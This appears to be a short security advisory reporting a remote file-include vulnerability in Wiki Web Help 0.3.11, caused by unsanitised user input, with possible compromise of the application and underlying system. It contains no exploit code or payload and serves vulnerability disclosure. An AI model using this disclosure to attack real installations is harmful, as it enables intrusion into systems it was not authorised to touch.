Wiki Web Help is prone to a remote file-include vulnerability because it fails to sufficiently sanitize user-supplied input.

Exploiting this issue could allow an attacker to compromise the application and the underlying system; other attacks are also possible.

Wiki Web Help 0.3.11 is vulnerable; other versions may also be affected.
